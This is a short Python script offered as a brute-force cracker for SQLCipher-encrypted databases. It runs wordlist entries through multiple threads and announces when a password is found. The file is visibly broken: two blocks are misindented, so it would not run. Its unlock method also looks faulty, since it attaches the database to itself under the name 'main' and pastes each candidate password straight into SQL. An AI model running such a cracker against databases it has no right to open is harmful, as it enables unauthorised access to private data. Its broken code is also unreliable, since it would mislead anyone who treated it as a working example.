import os
import sys
from concurrent.futures import ThreadPoolExecutor
import sqlcipher3  # SQLCipher for Python



def attempt_unlock(password, db_path):
    """Attempt to unlock the SQLCipher database with a given password."""
    try:
        # Connect to the database using the password
        conn = sqlcipher3.connect(db_path)
        conn.execute(f"ATTACH DATABASE '{db_path}' AS main KEY '{password}'")
        
        # If no exception is raised, we successfully unlocked the database
        print(f"Password found: {password}")
        conn.close()
        return True
    except Exception as e:
        # Ignore the exception if password is wrong
        return False

def process_password_list(word_list, db_path, max_workers=4):
    """Process a word list in parallel to attempt unlocking the database."""
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        results = executor.map(lambda word: attempt_unlock(word.strip(), db_path), word_list)
        
        # Return True if a valid password was found, False otherwise
        for result in results:
            if result:
                return True
    return False


          def main(db_path, wordlist_path):
    """Main function to load wordlist and start the process."""
    if not os.path.exists(db_path):
        print(f"Error: Database file '{db_path}' not found.")
        return

    if not os.path.exists(wordlist_path):
        print(f"Error: Wordlist file '{wordlist_path}' not found.")
        return

    # Load word list
    with open(wordlist_path, 'r') as file:
        word_list = file.readlines()

    print(f"Starting brute-force with {len(word_list)} words from wordlist '{wordlist_path}'...")

    # Process the wordlist to attempt unlocking the database
    if not process_password_list(word_list, db_path):
        print("Password not found in the provided wordlist.")
    else:
        print("Password successfully cracked!")

   if __name__ == '__main__':
    # Usage: python script.py <path_to_database> <path_to_wordlist>
    if len(sys.argv) != 3:
        print("Usage: python script.py <path_to_database> <path_to_wordlist>")
        sys.exit(1)

    db_path = sys.argv[1]
    wordlist_path = sys.argv[2]

    main(db_path, wordlist_path)
       
          
